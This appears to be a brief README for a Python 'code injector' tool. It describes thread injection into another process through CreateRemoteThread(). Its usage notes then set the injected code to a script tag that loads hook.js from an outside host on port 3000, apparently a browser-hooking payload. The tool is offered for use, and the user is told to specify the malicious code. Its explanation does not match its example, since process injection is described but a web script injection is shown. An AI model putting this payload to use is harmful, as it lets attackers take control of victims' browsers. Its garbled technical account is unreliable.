A code injector is a technique for injecting standalone code into another process and then executing it. It is also called Thread injection because it is usually executed as a remote thread using the CreateRemoteThread() API, and the program is the one injecting the malicious code.

usage :
ex) python code_injector.py

*********************Cautions when using the program**********************
When using the program, you need to specify the code to be injected.
 injection_code = '<script src="http://myhomepage.com:3000/hook.js"></script>'
--> Please specify the code to be injected by the user.

